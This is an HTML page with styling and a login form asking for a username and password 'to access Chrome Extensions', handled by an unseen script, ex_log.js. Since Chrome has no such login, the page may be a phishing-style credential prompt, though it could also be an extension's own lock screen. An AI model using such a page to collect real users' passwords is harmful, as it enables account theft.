<!DOCTYPE html>
<html>
<head>
  <title>Login Required</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    
    .login-container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 350px;
    }
    
    h2 {
      margin-bottom: 10px;
      color: #333;
    }

    p {
      color: #555;
      font-size: 14px;
      margin-bottom: 20px;
    }

    .form-group {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
    }

    input {
      width: 90%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
      transition: border 0.3s ease-in-out;
    }

    input:focus {
      border: 1px solid #3498db;
      outline: none;
      box-shadow: 0 0 5px rgba(52, 152, 219, 0.5);
    }

    button {
      width: 95%;
      background: #3498db;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 14px;
      transition: background 0.3s ease;
      margin-top: 10px;
    }

    button:hover {
      background: #2980b9;
    }

    .error {
      color: red;
      font-size: 13px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Login Required</h2>
    <p>Please enter your credentials to access Chrome Extensions.</p>
    
    <div class="form-group">
      <input type="text" id="username" placeholder="Username">
      <input type="password" id="password" placeholder="Password">
      <button id="log-button">Login</button>
    </div>

    <p id="error-message" class="error"></p>
  </div>
  
  <script src="ex_log.js"></script>
</body>
</html>
